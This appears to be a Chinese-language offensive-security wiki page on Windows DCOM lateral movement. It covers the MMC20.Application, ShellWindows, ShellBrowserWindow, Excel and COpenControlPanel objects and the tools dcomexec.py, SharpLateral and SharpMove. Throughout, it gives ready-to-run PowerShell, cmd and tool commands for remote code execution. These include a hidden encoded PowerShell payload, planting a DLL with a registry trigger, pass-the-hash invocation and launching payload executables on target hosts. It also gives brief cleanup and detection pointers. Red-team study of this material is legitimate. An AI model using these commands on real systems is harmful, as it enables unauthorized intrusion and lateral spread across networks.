# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM 横向移动很有吸引力，因为它会复用通过 RPC/DCOM 暴露的现有 COM 服务器，而不是创建服务或计划任务。实际上，这意味着初始连接通常从 TCP/135 开始，然后转到动态分配的高位 RPC 端口。

## 前提条件与注意事项

- 通常需要在目标上拥有本地管理员权限，并且远程 COM 服务器必须允许远程启动/激活。
- 自 **2023 年 3 月 14 日** 起，Microsoft 对受支持的系统强制实施 DCOM 加固。请求较低激活身份验证级别的旧客户端可能会失败，除非它们协商到至少 `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`。现代 Windows 客户端通常会自动提升级别，因此当前的工具一般仍可正常工作。<sup>[[3]](#references)</sup>
- 手动或通过脚本执行 DCOM 通常需要 TCP/135 以及目标的动态 RPC 端口范围。如果使用 Impacket 的 `dcomexec.py` 并希望获取命令输出，通常还需要能够通过 SMB 访问 `ADMIN$`（或其他可读写的共享）。
- 如果 RPC/DCOM 可用但 SMB 被阻止，`dcomexec.py -nooutput` 仍可用于盲执行。

快速检查：

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

有关此技术的更多信息，请查看 [原始 MMC20.Application 帖子](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)。<sup>[[1]](#references)</sup>

分布式组件对象模型 (DCOM) 对象为基于网络的对象交互提供了有趣的能力。Microsoft 提供了有关 DCOM 和组件对象模型 (COM) 的全面文档，可分别在[此处查看 DCOM 文档](https://msdn.microsoft.com/en-us/library/cc226801.aspx)和[此处查看 COM 文档](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)。可以使用以下 PowerShell 命令检索 DCOM 应用程序列表：

```bash
Get-CimInstance Win32_DCOMApplication
```

COM 对象 [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) 可用于通过脚本执行 MMC 管理单元操作。值得注意的是，此对象在 `Document.ActiveView` 下包含一个 `ExecuteShellCommand` 方法。有关此方法的更多信息，请参阅[此处](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)。检查它是否正在运行：<sup>[[6]](#references)</sup>

此功能可通过 DCOM 应用程序在网络上执行命令。若要以管理员身份远程与 DCOM 交互，可以使用 PowerShell，如下所示：

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

此命令连接到 DCOM 应用程序并返回一个 COM 对象实例。随后可以调用 ExecuteShellCommand 方法，在远程主机上执行进程。该过程包括以下步骤：

检查方法：

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Get RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

最后一个参数是窗口样式。`7` 会使窗口保持最小化。从操作层面看，基于 MMC 的执行通常会导致远程 `mmc.exe` 进程生成你的 payload，这与下面由 Explorer 承载的对象不同。

## ShellWindows & ShellBrowserWindow

**如需了解此技术的更多信息，请查看原始文章 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

观察发现，**MMC20.Application** 对象没有应用程序专属的 `LaunchPermission` 值。<sup>[[2]](#references)</sup> 这本身并不授予访问权限：COM 会检查计算机的 `DefaultLaunchPermission` ACL，以及适用时的计算机范围启动/访问限制。<sup>[[9]](#references)[[10]](#references)</sup> 如需了解更多细节，可以查看[此处](https://twitter.com/tiraniddo/status/817532039771525120)的讨论；同时建议使用 [@tiraniddo](https://twitter.com/tiraniddo) 的 OleView .NET 筛选未显式设置 Launch Permission 的对象。

由于缺少显式的 Launch Permissions，`ShellBrowserWindow` 和 `ShellWindows` 这两个特定对象受到了关注。<sup>[[2]](#references)</sup> `HKCR:\AppID\{guid}` 下不存在 `LaunchPermission` 值，意味着没有应用程序专属的启动 ACL；这**并不**表示远程激活不受限制。<sup>[[9]](#references)[[10]](#references)</sup>

与 `MMC20.Application` 相比，从 OPSEC 角度看，这些对象通常更隐蔽，因为命令通常会在远程主机上成为 `explorer.exe` 的子进程，而不是 `mmc.exe` 的子进程。

### ShellWindows

对于没有 ProgID 的 `ShellWindows`，.NET 方法 `Type.GetTypeFromCLSID` 和 `Activator.CreateInstance` 可通过其 CLSID 实例化对象。此过程使用 OleView .NET 获取 `ShellWindows` 的 CLSID。实例化后，可以通过 `WindowsShell.Item` 方法与对象交互，进而调用诸如 `Document.Application.ShellExecute` 的方法。<sup>[[2]](#references)</sup>

下面给出了用于实例化对象并远程执行命令的 PowerShell 示例：

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` 类似，但你可以直接通过它的 CLSID 实例化，并转向 `Document.Application.ShellExecute`：

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### 使用 Excel DCOM 对象进行横向移动

可以通过利用 DCOM Excel 对象实现横向移动。有关详细信息，建议阅读 [Cybereason 的博客](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) 中关于利用 Excel DDE 通过 DCOM 实现横向移动的讨论。<sup>[[5]](#references)</sup>

Empire 项目提供了一个 PowerShell 脚本，演示了如何通过操纵 DCOM 对象来利用 Excel 实现远程代码执行 (RCE)。以下是该脚本中的代码片段，该脚本可在 [Empire 的 GitHub 仓库](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 获取，展示了利用 Excel 实现 RCE 的不同方法：

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

近期研究通过 `Excel.Application` 的 `ActivateMicrosoftApp()` 方法拓展了这一领域。核心思路是，Excel 可以通过搜索系统 `PATH` 来尝试启动 FoxPro、Schedule Plus 或 Project 等旧版 Microsoft 应用程序。如果 operator 能将 payload 放置在目标 `PATH` 中某个可写位置，并使用这些应用程序预期的名称，Excel 就会执行它。<sup>[[4]](#references)</sup>

此变体的要求：

- 目标上具有本地管理员权限
- 目标上已安装 Excel
- 能够将 payload 写入目标 `PATH` 中的可写目录

利用 FoxPro 查找机制的实际示例（`FOXPROW.exe`）：

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

如果攻击主机未注册本地 `Excel.Application` ProgID，则改为通过 CLSID 实例化远程对象：

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

实际中观察到被滥用的值：

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 加载已注册的 Control Panel DLL

`COpenControlPanel` 类（CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`）公开了 `IOpenControlPanel`（IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`）。其 `Open()` 方法会使远程 `dllhost.exe` 加载在 `Control Panel\Cpls` 键下注册的 Control Panel DLL。在经过测试的系统中，该类没有显式的启动/访问权限，因此继承默认的 DCOM 策略（通常要求管理员身份才能进行远程激活）。任意随机的项目名称就足以让 `Open()` 处理已注册的 DLL；payload 不需要带有 `.cpl` 扩展名，但必须是架构正确的有效 DLL。<sup>[[7]](#references)</sup>

此原语需要**先部署再触发**，并非仅靠命令即可执行：首先将 DLL 复制到目标，并创建一个指向该 DLL 的 `REG_EXPAND_SZ` 值，然后通过 DCOM 激活该对象。例如，在具有管理员权限的 Windows 环境中：<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

公开的 [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) 客户端使用 Impacket 实现了未公开的 DCOM 调用。只需提供任意控制面板项名称；即使 `dllhost.exe` 已加载 DLL，客户端仍可能报告 RPC 错误。<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

从操作层面来看，这条路径还需要文件写入通道和远程注册表访问，因此比 `MMC20`/`ShellWindows` 更容易留下痕迹。它还会产生持久化副作用，因为之后打开控制面板时可能会再次加载同一条目。执行后请删除该值，并排查 `dllhost.exe` 中是否存在异常的 DLL 加载，以及 `Control Panel\Cpls` 下是否存在异常值。<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### 横向移动自动化工具

这里介绍了两种用于自动化这些技术的工具：

- **Invoke-DCOM.ps1**：Empire 项目提供的 PowerShell 脚本，可简化调用不同方法以在远程计算机上执行代码。此脚本可在 Empire 的 GitHub 仓库中获取。

- **SharpLateral**：用于远程执行代码的工具，可使用以下命令：

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## 自动化工具

- Powershell 脚本 [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) 可以轻松调用所有已注释的方式，在其他计算机上执行代码。
- 你可以使用 Impacket 的 `dcomexec.py` 通过 DCOM 在远程系统上执行命令。当前版本支持 `ShellWindows`、`ShellBrowserWindow` 和 `MMC20`，默认使用 `ShellWindows`。

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- 你也可以使用 [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- 你也可以使用 [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [使用 MMC20.Application COM 对象进行横向移动](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [通过 DCOM 进行横向移动：第二回](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—管理 Windows DCOM Server Security Feature Bypass (CVE-2021-26414) 的相关更改](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [横向移动：利用 DCOM Excel Application 的强大功能](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [利用 Excel DDE 通过 DCOM 进行横向移动](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [使用 DCOM 对象远程执行命令](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM：附录 B，产品行为 - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
